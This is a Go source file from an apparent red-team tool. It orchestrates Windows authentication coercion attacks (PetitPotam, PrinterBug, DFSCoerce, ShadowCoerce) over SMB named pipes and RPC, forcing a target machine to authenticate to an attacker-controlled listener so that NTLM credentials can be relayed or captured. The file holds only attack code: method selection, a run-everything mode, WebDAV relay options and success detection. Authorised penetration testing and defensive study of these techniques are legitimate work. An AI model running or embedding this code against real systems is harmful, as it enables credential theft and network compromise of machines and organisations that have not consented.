// Package coerce provides authentication coercion techniques for red team operations.
//
// Coercion attacks force a target Windows machine to authenticate to an
// attacker-controlled listener, enabling NTLM relay or hash capture.
//
// Supported techniques:
//   - PetitPotam (MS-EFSR) - EfsRpcOpenFileRaw and related
//   - SpoolSample/PrinterBug (MS-RPRN) - RpcRemoteFindFirstPrinterChangeNotificationEx
//   - DFSCoerce (MS-DFSNM) - NetrDfsAddStdRoot
//   - ShadowCoerce (MS-FSRVP) - IsPathShadowCopied
package coerce

import (
	"context"
	"fmt"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb"
)

// Coercer defines the interface for coercion techniques
type Coercer interface {
	// Name returns the coercion method name (e.g., "PetitPotam")
	Name() string

	// Description returns a description of the technique
	Description() string

	// PipeName returns the required named pipe
	PipeName() string

	// InterfaceUUID returns the RPC interface UUID
	InterfaceUUID() dcerpc.UUID

	// InterfaceVersion returns the interface version
	InterfaceVersion() uint32

	// Opnums returns the operation numbers that can trigger coercion
	Opnums() []OpnumInfo

	// Coerce attempts to trigger authentication to the listener
	// Returns nil on success, error otherwise
	Coerce(ctx context.Context, rpc *dcerpc.Client, listener string, opts CoerceOptions) error
}

// OpnumInfo describes a coercion-capable operation
type OpnumInfo struct {
	Opnum       uint16
	Name        string
	Description string
}

// CoerceOptions controls coercion behavior
type CoerceOptions struct {
	// UseHTTP uses HTTP WebDAV paths instead of UNC for relay attacks
	UseHTTP bool

	// HTTPPort is the port for HTTP callbacks (default 80)
	HTTPPort int

	// SpecificOpnum tests only this opnum (-1 for all)
	SpecificOpnum int

	// FireAll continues testing all opnums even after success
	FireAll bool

	// Verbose enables detailed output
	Verbose bool
}

// DefaultCoerceOptions returns default options
func DefaultCoerceOptions() CoerceOptions {
	return CoerceOptions{
		HTTPPort:      80,
		SpecificOpnum: -1,
	}
}

// Result represents the result of a coercion attempt
type Result struct {
	Method   string
	Opnum    uint16
	Success  bool
	Message  string
	PathUsed string
}

// CoercionRunner coordinates coercion attacks
type CoercionRunner struct {
	session  *smb.Session
	ipcTree  *smb.Tree
	coercers []Coercer
	results  []Result
}

// NewRunner creates a new coercion runner
func NewRunner(session *smb.Session, ipcTree *smb.Tree) *CoercionRunner {
	return &CoercionRunner{
		session:  session,
		ipcTree:  ipcTree,
		coercers: AllCoercers(),
	}
}

// AllCoercers returns all available coercion methods
func AllCoercers() []Coercer {
	return []Coercer{
		NewPetitPotam(),
		NewSpoolSample(),
		NewDFSCoerce(),
		NewShadowCoerce(),
	}
}

// Run executes coercion with the specified method
func (r *CoercionRunner) Run(ctx context.Context, methodName, listener string, opts CoerceOptions) ([]Result, error) {
	var coercer Coercer

	// Find the requested method
	for _, c := range r.coercers {
		if c.Name() == methodName {
			coercer = c
			break
		}
	}

	if coercer == nil {
		return nil, fmt.Errorf("unknown coercion method: %s", methodName)
	}

	return r.runCoercer(ctx, coercer, listener, opts)
}

// RunAll tries all coercion methods
func (r *CoercionRunner) RunAll(ctx context.Context, listener string, opts CoerceOptions) ([]Result, error) {
	var allResults []Result

	for _, coercer := range r.coercers {
		results, err := r.runCoercer(ctx, coercer, listener, opts)
		if err != nil {
			// Log error but continue with other methods
			allResults = append(allResults, Result{
				Method:  coercer.Name(),
				Success: false,
				Message: err.Error(),
			})
			continue
		}
		allResults = append(allResults, results...)

		// Stop if we got a success and FireAll is not set
		for _, result := range results {
			if result.Success && !opts.FireAll {
				return allResults, nil
			}
		}
	}

	return allResults, nil
}

// runCoercer executes a single coercer
func (r *CoercionRunner) runCoercer(ctx context.Context, coercer Coercer, listener string, opts CoerceOptions) ([]Result, error) {
	// Open the required pipe
	p, err := pipe.Open(ctx, r.ipcTree, coercer.PipeName())
	if err != nil {
		return nil, fmt.Errorf("failed to open pipe %s: %w", coercer.PipeName(), err)
	}
	defer p.Close()

	// Create RPC client
	rpc := dcerpc.NewClient(p)

	// Bind to the interface
	if err := rpc.Bind(coercer.InterfaceUUID(), coercer.InterfaceVersion()); err != nil {
		return nil, fmt.Errorf("bind failed: %w", err)
	}

	// Execute coercion
	err = coercer.Coerce(ctx, rpc, listener, opts)

	// Build result
	result := Result{
		Method:  coercer.Name(),
		Success: err == nil || isCoercionSuccess(err),
		Message: formatResultMessage(err),
	}

	return []Result{result}, err
}

// isCoercionSuccess checks if an error indicates successful coercion
func isCoercionSuccess(err error) bool {
	if err == nil {
		return true
	}
	msg := err.Error()
	// ERROR_BAD_NETPATH (0x6f7) means the server tried to reach our listener
	return msg == "ERROR_BAD_NETPATH" || msg == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked"
}

// formatResultMessage formats the result message
func formatResultMessage(err error) string {
	if err == nil {
		return "Coercion successful"
	}
	if isCoercionSuccess(err) {
		return "Coercion triggered (ERROR_BAD_NETPATH)"
	}
	return err.Error()
}

// ListMethods returns available coercion methods
func ListMethods() []string {
	var methods []string
	for _, c := range AllCoercers() {
		methods = append(methods, c.Name())
	}
	return methods
}

// GetCoercer returns a coercer by name
func GetCoercer(name string) Coercer {
	for _, c := range AllCoercers() {
		if c.Name() == name {
			return c
		}
	}
	return nil
}
